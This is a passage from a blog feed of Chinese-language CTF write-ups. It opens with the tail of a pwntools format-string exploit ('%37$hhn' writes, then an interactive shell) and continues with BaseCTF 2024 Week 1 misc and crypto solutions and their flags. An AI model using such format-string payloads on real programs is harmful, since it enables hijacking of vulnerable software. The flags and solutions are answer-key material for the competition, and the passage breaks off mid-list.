class="number">0xff</span>) + <span class="string">&#x27;c%37$hhn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BaseCTF WriteUp</title>
      <link href="/2024/08/22/BaseCTF%202024/"/>
      <url>/2024/08/22/BaseCTF%202024/</url>
      
        <content type="html"><![CDATA[<h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h4 id="Week1-你也喜欢圣物吗"><a href="#Week1-你也喜欢圣物吗" class="headerlink" title="[Week1] 你也喜欢圣物吗"></a>[Week1] 你也喜欢圣物吗</h4><p>zsteg得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extradata:0 .. text: &quot;RE9fWU9VX0tOT1dfRVpfTFNCPw==&quot; //DO_YOU_KNOW_EZ_LSB?</span><br></pre></td></tr></table></figure><p>猜测是LSB隐写，提取RGB的0通道信息，得到压缩包解压密码<code>lud1_lud1</code></p><p>解压得到压缩包<code>it is fake.zip</code>，猜测是伪加密，通过ZipCracker修复伪加密</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@root:~/ZipCracker-main$ python3 ZipCracker.py flag.zip</span><br><span class="line">                          </span><br><span class="line">     ______          ____                _   [*]Hx0战队      </span><br><span class="line">    |__  (_)_ __    / ___|_ __ __ _  ___| | _____ _ __ </span><br><span class="line">      / /| | &#x27;_ \  | |   | &#x27;__/ _` |/ __| |/ / _ \ &#x27;__|</span><br><span class="line">     / /_| | |_) | | |___| | | (_| | (__|   &lt;  __/ |   </span><br><span class="line">    /____|_| .__/___\____|_|  \__,_|\___|_|\_\___|_|   </span><br><span class="line">           |_| |_____|                                 </span><br><span class="line">    #Coded By Asaotomo               Update:2024.07.15</span><br><span class="line">            </span><br><span class="line">[!]系统检测到 flag.zip 是一个加密的ZIP文件</span><br><span class="line">[*]压缩包 flag.zip 为伪加密，系统已为您生成修复后的压缩包(fix_flag.zip)，并自动提取出1个文件：[&#x27;flag.txt&#x27;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Base64解码flag.txt文件得到：<code>flag&#123;0h_n0_it&#39;s_f3ke&#125;QmFzZUNURnsxdTBfcTFfeDFfNTFrMX0=</code></p><p>对后半段再次解码得到<code>BaseCTF&#123;1u0_q1_x1_51k1&#125;</code></p><h4 id="Week1-根本进不去啊"><a href="#Week1-根本进不去啊" class="headerlink" title="[Week1] 根本进不去啊!"></a>[Week1] 根本进不去啊!</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">osboxes@osboxes:~$ dig flag.basectf.fun ANY</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.28-0ubuntu0.22.04.1-Ubuntu &lt;&lt;&gt;&gt; flag.basectf.fun ANY</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 9740</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 13</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 65494</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;flag.basectf.fun.INANY</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">flag.basectf.fun.0INTXT&quot;FLAG: BaseCTF&#123;h0h0_th1s_15_dns_rec0rd&#125;&quot;</span><br><span class="line"></span><br><span class="line">;; ADDITIONAL SECTION:</span><br><span class="line">arlen.dnspod.net.0INA117.89.178.173</span><br><span class="line">arlen.dnspod.net.0INA120.241.130.98</span><br><span class="line">arlen.dnspod.net.0INA129.211.176.209</span><br><span class="line">arlen.dnspod.net.0INA1.12.0.4</span><br><span class="line">arlen.dnspod.net.0INA112.80.181.45</span><br><span class="line">crab.dnspod.net.0INA1.12.0.1</span><br><span class="line">crab.dnspod.net.0INA36.155.149.176</span><br><span class="line">crab.dnspod.net.0INA112.80.181.111</span><br><span class="line">crab.dnspod.net.0INA117.89.178.184</span><br><span class="line">crab.dnspod.net.0INA129.211.176.239</span><br><span class="line">arlen.dnspod.net.0INAAAA2402:4e00:1430:1102:0:9136:2b30:e554</span><br><span class="line">crab.dnspod.net.0INAAAA2402:4e00:111:fff::c</span><br><span class="line"></span><br><span class="line">;; Query time: 52 msec</span><br><span class="line">;; SERVER: 127.0.0.53#53(127.0.0.53) (TCP)</span><br><span class="line">;; WHEN: Fri Aug 16 09:04:34 EDT 2024</span><br><span class="line">;; MSG SIZE  rcvd: 333</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Week1-海上遇到了鲨鱼"><a href="#Week1-海上遇到了鲨鱼" class="headerlink" title="[Week1] 海上遇到了鲨鱼"></a>[Week1] 海上遇到了鲨鱼</h4><p>导出HTTP对象，保存flag.php，字符串翻转得到flag</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">original_string = <span class="string">&quot;&#125;67bf613763ca-50b3-4437-7a3a-b683fe51&#123;FTCesaB&quot;</span></span><br><span class="line">reversed_string = original_string[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;&#123;&#123;<span class="subst">&#123;reversed_string&#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>BaseCTF{15ef386b-a3a7-7344-3b05-ac367316fb76}</p><h4 id="Week1-Base"><a href="#Week1-Base" class="headerlink" title="[Week1] Base"></a>[Week1] Base</h4><p>Cyberchef解码得到</p><p>BaseCTF{we1c0me_to_b4sectf}</p><h4 id="Week1-正着看还是反着看呢？"><a href="#Week1-正着看还是反着看呢？" class="headerlink" title="[Week1] 正着看还是反着看呢？"></a>[Week1] 正着看还是反着看呢？</h4><p>先对文件进行倒序和翻转</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f_in, <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f_out:</span><br><span class="line">        data = f_in.read()</span><br><span class="line">        hex_str = data.<span class="built_in">hex</span>()</span><br><span class="line">        reversed_hex_str = hex_str[::-<span class="number">1</span>]</span><br><span class="line">        flipped_hex = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(reversed_hex_str), <span class="number">2</span>):</span><br><span class="line">            flipped_hex += reversed_hex_str[i:i+<span class="number">2</span>][::-<span class="number">1</span>]</span><br><span class="line">        f_out.write(<span class="built_in">bytes</span>.fromhex(flipped_hex))</span><br><span class="line"></span><br><span class="line">edit(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;flag.jpg&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Binwalk分离图片得到flag</p><p>BaseCTF{h3ll0_h4cker}</p><h4 id="Week1-人生苦短，我用Python"><a href="#Week1-人生苦短，我用Python" class="headerlink" title="[Week1] 人生苦短，我用Python"></a>[Week1] 人生苦短，我用Python</h4><p>根据约束条件得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">1. flag的长度必须是38个字符</span><br><span class="line"></span><br><span class="line">2. flag必须以&#x27;BaseCTF&#123;&#x27;开头</span><br><span class="line"></span><br><span class="line">3. flag的第10和11个字符必须是&#x27;Mp&#x27;</span><br><span class="line"></span><br><span class="line">4. flag的最后3个字符重复8次必须等于&#x27;3x&#125;3x&#125;3x&#125;3x&#125;3x&#125;3x&#125;3x&#125;3x&#125;&#x27;</span><br><span class="line"></span><br><span class="line">5. flag的最后一个字符的ASCII码必须是125(即&#x27;&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">6. flag中必须包含4个下划线字符&#x27;_&#x27;</span><br><span class="line"></span><br><span class="line">7. 用&#x27;_&#x27;分割flag后,得到的5个部分长度必须分别为14,2,6,4,8</span><br><span class="line"></span><br><span class="line">8. flag的第12、16、20、24、28个字符必须组成&#x27;lsT_n&#x27;</span><br><span class="line"></span><br><span class="line">9. flag的前9个字符大写后用猫表情分隔必须等于&#x27;B😺A😺S😺E😺C😺T😺F😺&#123;😺S&#x27;</span><br><span class="line"></span><br><span class="line">10. flag倒数第11个字符必须是数字,且它的5次方等于1024(即为4)</span><br><span class="line"></span><br><span class="line">11. flag倒数第7到倒数第4个字符base64编码后必须等于&#x27;MG1QbA==&#x27;</span><br><span class="line"></span><br><span class="line">12. flag每隔7个字符取一个,逆序后转为十六进制必须等于&#x27;7d4372733173&#x27;</span><br><span class="line"></span><br><span class="line">13. flag的第12、23、34个字符集合必须是&#123;&#x27;l&#x27;, &#x27;r&#x27;&#125;</span><br><span class="line"></span><br><span class="line">14. flag的第21到26个字符转ASCII必须等于[116, 51, 114, 95, 84, 104]</span><br><span class="line"></span><br><span class="line">15. flag的第17到19个字符分别乘以2024_08_15的0、1、2次方得到的结果等于41378751114180610</span><br><span class="line"></span><br><span class="line">16. flag的第1个字符必须是字母,第9个必须是小写,第14个必须是数字</span><br><span class="line"></span><br><span class="line">17. flag的第14和16个字符必须组成&#x27;3 1&#x27;,且&#x27;3&#x27;替换为&#x27;bro&#x27;后等于&#x27;bro 1&#x27;</span><br><span class="line"></span><br><span class="line">18. flag的SHA1哈希必须等于&#x27;e40075055f34f88993f47efb3429bd0e44a7f479&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>BaseCTF{s1Mpl3_1s_BeTt3r_Th4n_C0mPl3x}</p><h4 id="Week1-捂住X只耳"><a href="#Week1-捂住X只耳" class="headerlink" title="[Week1] 捂住X只耳"></a>[Week1] 捂住X只耳</h4><p>使用Audacity分离立体声到单声道，导出音频，在Adobe Audition中新建混音项目，将两端音频分别导入两条轨道，对其中一条轨道的音频进行反相效果处理，然后导出多轨混音，得到一段只有Morse Code的音频</p><p>![[Week1] 捂住X只耳](.[Week1] 捂住X只耳.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">..-. --- .-.. .-.. --- .-- -.-- --- ..- .-. .... . .- .-. -</span><br><span class="line">FOLLOWYOURHEART</span><br></pre></td></tr></table></figure><p>BaseCTF{FOLLOWYOURHEART}</p><h4 id="Week1-倒计时？海报！"><a href="#Week1-倒计时？海报！" class="headerlink" title="[Week1] 倒计时？海报！"></a>[Week1] 倒计时？海报！</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. ght&#125; // Green plane 3</span><br><span class="line">2. ev3ry_n1 // Red plane 3</span><br><span class="line">3. 0_do_1t_  // Red plane 3</span><br><span class="line">4. d_h@rd_t // Red plane 3</span><br><span class="line">5. y_c0o1_@n // Green plane 3</span><br><span class="line">6. 5_re@11 // Red plane 3</span><br><span class="line">7. ery_d@y_i // Red plane 1</span><br><span class="line">8. ro3_X_ev // Red plane 2</span><br><span class="line">9. t_d0wn_f // Red plane 3</span><br><span class="line">10. BaseCTF&#123;c0un // Red plane 1</span><br></pre></td></tr></table></figure><p><img src="/.%5C%E6%B5%B7%E6%8A%A5.png" alt="海报"></p><p>BaseCTF{c0unt_d0wn_fro3_X_every_d@y_i5_re@11y_c0o1_@nd_h@rd_t0_do_1t_ev3ry_n1ght}</p><h4 id="Week1-签到！DK-盾！"><a href="#Week1-签到！DK-盾！" class="headerlink" title="[Week1] 签到！DK 盾！"></a>[Week1] 签到！DK 盾！</h4><p>微信公众号签到得到flag</p><p>BaseCTF{2024_sp0n5ored_by_dkdun}</p><h4 id="Week1-喵喵太可爱了"><a href="#Week1-喵喵太可爱了" class="headerlink" title="[Week1] 喵喵太可爱了"></a>[Week1] 喵喵太可爱了</h4><p>![[Week1] 喵喵太可爱了](.[Week1] 喵喵太可爱了.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;m1a0_mi@o_1s_n0t_a_b3tr4yer_t0_t3l1_the_f1ag&#125;</span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h4 id="Week1-ez-math"><a href="#Week1-ez-math" class="headerlink" title="[Week1] ez_math"></a>[Week1] ez_math</h4><p>factordb.com分离出a、b、c、d</p><p>根据题目可列出方程<br>$$<br>\text{flag} \times (1 + p_1 \times p_4 + p_2 \times p_5) &#x3D; 73595299897883318809385485549070133693240974831930302408429664709375267345973630251242462442287906226820558620868020093702204534513147710406187365838820773200509683489479230005270823245<br>$$</p><p>$$<br>\text{flag} \times (p_1 + p_2 \times p_6) + c \times p_2 &#x3D; 46106113894293637419638880781044700751458754728940339402825975283562443072980134956975133603010158365617690455079648357103963721564427583836974868790823082218575195867647267322046726830<br>$$</p><p>$$<br>\text{flag} \times p_2 &#x3D; 161159443444728507357705839523372181165265338895748546250868368998015829266587881868060439602487400399254839839711192069105943123376622497847079185<br>$$</p><p>$$<br>a \times (p_4 + p_3 \times p_5) + b \times p_5 &#x3D; 13874395612510317401724273626815493897470313869776776437748145979913315379889260408106588331541371806148807844847909<br>$$</p><p>$$<br>c \times (p_4 + p_3 \times p_5) + d \times p_5 &#x3D; 11314088133820151155755028207579196628679021106024798818326096960197933616112389017957501267749946871903275867785729<br>$$</p><p>$$<br>a \times (1 + p_3 \times p_6) + b \times p_6 &#x3D; 17025249852164087827929313934411832021160463738288565876371918871371314930048841650464137478757581505369909723030523<br>$$</p><p>$$<br>a \times p_3 + b &#x3D; 59510107422473463833740668736202898422777415868238817665123293560097821015330<br>$$</p><p>$$<br>c \times (1 + p_3 \times p_6) + d \times p_6 &#x3D; 13883500421020573457778249958402264688539607625195400103961001780695107955462968883861677871644577542226749179056659<br>$$</p><p>$$<br>c \times p_3 + d &#x3D; 48528427402189936709203219516777784993195743269405968907408051071264464132448<br>$$</p><p>解方程得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = 293124197879399252223245955841307374193</span><br><span class="line">b = 294816936919419198311047310603595242713</span><br><span class="line">c = 239032610975319686124167120759414114611</span><br><span class="line">d = 292585039548930662326103829416538145189</span><br><span class="line">p3 = 203020111792196156830422191553831438169</span><br><span class="line">p4 = 247964645781704461942226536615392593243</span><br><span class="line">p5 = 233143514832083382411678634471120865197</span><br><span class="line">p6 = 286090054102887627184069871552859027701</span><br></pre></td></tr></table></figure><p>z3约束求解得到flag:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag, p1, p2, c = Ints(<span class="string">&#x27;flag p1 p2 c&#x27;</span>)</span><br><span class="line">p4 = <span class="number">247964645781704461942226536615392593243</span></span><br><span class="line">p5 = <span class="number">233143514832083382411678634471120865197</span></span><br><span class="line">p6 = <span class="number">286090054102887627184069871552859027701</span></span><br><span class="line"></span><br><span class="line">eq1 = flag * (<span class="number">1</span> + p1 * p4 + p2 * p5) == <span class="number">73595299897883318809385485549070133693240974831930302408429664709375267345973630251242462442287906226820558620868020093702204534513147710406187365838820773200509683489479230005270823245</span></span><br><span class="line">eq2 = flag * (p1 + p2 * p6) + c * p2 == <span class="number">46106113894293637419638880781044700751458754728940339402825975283562443072980134956975133603010158365617690455079648357103963721564427583836974868790823082218575195867647267322046726830</span></span><br><span class="line">eq3 = flag * p2 == <span class="number">161159443444728507357705839523372181165265338895748546250868368998015829266587881868060439602487400399254839839711192069105943123376622497847079185</span></span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(eq1)</span><br><span class="line">s.add(eq2)</span><br><span class="line">s.add(eq3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    flag_value = m[flag].as_long()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag = &quot;</span>, long_to_bytes(flag_value))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;p1 = &quot;</span>, m[p1])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;p2 = &quot;</span>, m[p2])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>BaseCTF{7E9328AF-784C-8AF5-AC10-D6A8FC0977A8}</p><h4 id="Week1-babypack"><a href="#Week1-babypack" class="headerlink" title="[Week1] babypack"></a>[Week1] babypack</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">backpack</span>(<span class="params">a, c</span>):</span><br><span class="line">    flag = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">if</span> c - i &gt; <span class="number">0</span>:</span><br><span class="line">            flag.append(<span class="number">1</span>)</span><br><span class="line">            c -= i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag.append(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, flag)), <span class="number">2</span>))[<span class="number">2</span>:]).decode())</span><br><span class="line"></span><br><span class="line">a= [<span class="number">2487264674516612702148381262059366937897201508455413114345031288894980789076145147579418259432661232747375904997965581530362268904008339124626472045717075482791021095030019783589425299870946373246221582957232862473515</span>, <span class="number">491733695728183987781854883946776199363545034763223630648303216239781071808983441788738994635864262288104702316190256147614095355462666760091586746521889127102395089946736744234701020777747486645716679961505355358205</span>, <span class="number">110323038758283816811655397189354730775114318542406507944678995133064353922234139010858233544980338693080719766808774615216332973443076471838385315798081800456260331047745824029902641504699030254172864776140503685719</span>, <span class="number">21329601123439484788549839891633989762344638209267595412456647269024794605613697213699096256470155035750114059504925376661660484839061252258268241386676023785213539005867805566800471943519247336183762390966700950019</span>, <span class="number">7146972597944713271040951137457604863561388249875746261956055482229418349264570561740906104126974792505856583850338097727129246644471065603435449813884941071413766137227119139128098345457922432088128969598942863267</span>, <span class="number">1346101131622672931978096423414991055086097907048045187836881598919564312718270178534519827267497280433625574785132174894812908583233359458000469975702103413693480199742325839719191134247009906270778775450756715188</span>, <span class="number">431832097768527518676165198802192386603746291434967601504548859319580699889723090943427634867984592194172569910901514799190511020246917662162535632202054961537707269684557393598823535364874075052250490284484829188</span>, <span class="number">140385263282271996264759155211641776877746297983736897311922733831813190094504225023609340831846735540994403916688230922925129855025970272950216444321463493579227283703118512150491635819942098587286980862817753505</span>, <span class="number">34223371325515207445588748757581712557393912157235932688701226001484995652561037930828670928779595410194265999875772181711329727812185265441887453894003309876654082495957062628413923487565276953961953102939899664</span>, <span class="number">11277905223110088306111589808536546872836546320235997789453098291242971723694602770076671423955063276020078678714571127064308764611705435202479293805661470178917099557275252963592432838615626750886647727435412727</span>, <span class="number">2615533435460831263145388899927800470846179005257762751742107113431800042995970550154282940437470113325491219189765587324789634252029440596113709555932091761129000675863727140738692649309833681187804499985953136</span>, <span class="number">936680841170458882946412959909966575946011948314629933325082014426837165501136249855420901858482634295013806361789689361684904674438042695516337484436348646919308417999556756779144910987756875858573687134864914</span>, <span class="number">240803995584844951172124454225548986410808735949094019867567366838810221297826531921690948148961695516283629928962961745839887826049348862278548294987215333063020792491250359616172365439958324315638641990190536</span>, <span class="number">74980313650452416147684959971591530004150916322659108850519926847892455755211157414650129501071119906261853154503022754482691495645170933619292755026582075009055897885581671027043347130782615603358690889357969</span>, <span class="number">17373734350550516610959609643239951947839958095899981508834140825450716407631617618229082722622331706459216379319570540046133821392793975119423828799726656124807834541043219269949459907314628636546219059231483</span>, <span class="number">4383939698435145446949414991318424065438281430941348230548310095735465803169460840233678696507780083107318568406471009158126616954496458697727524252433591785759305622568557705826283690985480130620325779855269</span>, <span class="number">1070435075033499499988967771003353861621342562651011567215908784740129578236135452228720299864117045007232989018924013752836270314752592099997410344317383430641687448457000377071747633795773722163076615405153</span>, <span class="number">354613024399513291150023928129989293929227226203084151945112636505041432337820329935805740802403361855625313123094613318180050195219366366832494130593248906011113600242755768635094775633827342114020854687801</span>, <span class="number">82597124584081826710375601757684765457467298282386480837692933784824657535317108286212691529276214884031365269733862817274058538453459456296256548913748615606422415053313052283494323168620576805637766138197</span>, <span class="number">26135834190257866104316629323550052649627679758726229473294221139854796563641126471998920211481501156701889782668173105315082084500683017294728437322818254222939692828669475566191154442279318530752996234399</span>, <span class="number">5321914533271631715766698346734309258597941523919808971175049357994196078126479079595401724485236733828962687678778457409546781470810737250537642200901652790857563365204935103019528537962033407161035692676</span>, <span class="number">1401112116815344363602973427355047116358185953451255358550792547953394603648490800732761959337994181037602301212276448178218413428984435465643957862122433848889149559184391769249005008972240636924677483332</span>, <span class="number">340703164964920022751406615239919113589733348338271455697386514814772581315065581482054968704086006813510346859307625729162886049905513425065578320526943584411252201523709613325050800852296078315276309498</span>, <span class="number">87840565476176074750781589683807196881040923233689789764972859007886298300522765664170224177346224637510402223797751637511990096677274023769380478419759017880813713095034065541851821136431753956971681001</span>, <span class="number">19670793194720557916718563116693476958260133378839723765611437953301903581689095646338017322208705125479649557618768892326788688569445543579968049624743997901012938768052637463357937838813048475700143702</span>, <span class="number">4813717864536159278344281889539442680460787707429632446095662166356039450500759565004728794684170823084248242129657936118206321365817871353015182900801593481805141407218121604733002829781487535789180828</span>, <span class="number">1042206069053701098495071546906704343612504895408542932593774355364200288153617940373728364353536406373351075906293793845088075847011440543341941529120830192687505151588415115374221938124244686599669458</span>, <span class="number">194044946903756616103043562433809500007183272927392950867023951726626302681204141127037211903589021504233703959475286805099197368181117710043885464503673129287184477006142067195426098588591382748102539</span>, <span class="number">57242060503628134854797583503415516863794342630010325140908044397602380211468806869876771678223543893631961137313994861319272460663638480876700367769402916003571424012128837346480997355093988632012775</span>, <span class="number">10220201967005002779370447788097151915347020902180766203690278038856770790331091587750957262611786369059831723020056245241984653662463224025520044810966000669665537134571188694822388194379280786606327</span>, <span class="number">3267926212173074655716273983885176036956276231571067023300127600981173234474770474267538130720791055154389260987137327011230845199160118826368874310750622421181065045300794979970673152630315803973451</span>, <span class="number">664310922264744733608679352162235206229153782441085066286192469594499932348386155418089005696350197905438895173077254739918594652439993237866669330317791070351667267902119216464673735535997917820053</span>, <span class="number">157621450510303034999027157498529810254434467859123877137482107910574969124384732028159729373548578204828393076100787322321913754468400698891584836797607004658385107761645961934718993971913922689493</span>, <span class="number">39332477720879659647769207180648194166511069149312182714850691343807294060027257884701895063257342090729165323939249852666973310856943035346466688523098612569329263778095249692454805322913109933451</span>, <span class="number">8981431226314577645818078061310516067058739244501260778838272265495867618491462415652789974290152305589437388668252286740099675804549931870318361834902625342381411139234786285243806607019356580655</span>, <span class="number">2112396066721715241251602227199629841249291526749264633946336472170358658345723532373776051582626845585398413757777914886165302637471620129930025840435283626998895529130832700898103592084193587990</span>, <span class="number">469796330799746978963007177579525242476491475859713462679382870110198758612531699613499280185379426640464846165230615898408348461001941619050157303936273348173453633557613625134687931175489772308</span>, <span class="number">115039894603762374765072518903656214032673578314477265152318302986985809844170481821167559173999270345678822988509361838537021290790266729339932399789571955857561187896624119148469524606927195502</span>, <span class="number">29664847413037439140755929162295500789926130685594096951097063583886105875553862215342779333568726148068998390489061260679772397420854474310952173916283562144502155749545173676547095974974938801</span>, <span class="number">6556839835049647931901086051581445260744766665407776927047263448383041272915616955807464961262297820118065353994454969038345182131864552405100904248845811998006038518360062998811216993218123317</span>, <span class="number">1777902487663062541759851155686901732751487652837314110752529657038468352750515100993079307083868172100714925159868062197729467104948375724637901426300367514987134187716080043905739938236648704</span>, <span class="number">496319028827230065370808145407239788641593404351668605447266421139929451476993248197319730317200648698252327668625409509842367526798038085336803728242097138638139634601057690936621540950362878</span>, <span class="number">91859873982601930765698107766946424315968932113724973875252752520495744658349166435087906664763198237819106317321871232725285852613201351155535304791295392982339051653723048621713854087558299</span>, <span class="number">27416797198170440695880404003135961426335900780086489077063102228234854286849577430053665684665123525576025865136178905344946412182398068100227278108238228179476948006111402146551358956042173</span>, <span class="number">6618792570596090569883178232621713030844697317972184177900266954498675602890666553071207714570183352868264445779550306428622314821163774496224109073830696331713973117656394498431868066547419</span>, <span class="number">2170402078990376080093979069174241330730093169079857263825716044536454255816623476318486713531051261924372354329543376436907081387161693951811518904258013624768207438418761774847657241464116</span>, <span class="number">444068419739995022918617734805868711289130441640491361059833564963918508148289061718666452354434057970227476744547047349557417149242164606932560068546338531971271707670031796603537502372902</span>, <span class="number">116657711114961473575551110004924695540253659208616449841332120251303948007722209463493630964437083428655981974738051994193994806043789586554127478932520376572981058192629163539170482099439</span>, <span class="number">26060438230704097273528583087224964538829526126764669880723211182150736154082956489319587015488424248074673973497150602509972124276820315641896501503925719577821672512750083923483639733416</span>, <span class="number">6312791407424911633066282842976932623335914208291314848182683302453777089215292160945721990083867179076948154652506406356338815828714441906485780965753668277560566183244931348859397184996</span>, <span class="number">1692738421964980687206278894671327723911704272751755954222196367628340111939187266884312772028554097537058570911615150944663230388612366056826914851034642492298594744849153229556190046330</span>, <span class="number">467525048501123667461709936020772038812998605707446973687794928398759672463134111033796530786478727006399722869173671763892936977996495279695995929887621412909042553923445043307978487073</span>, <span 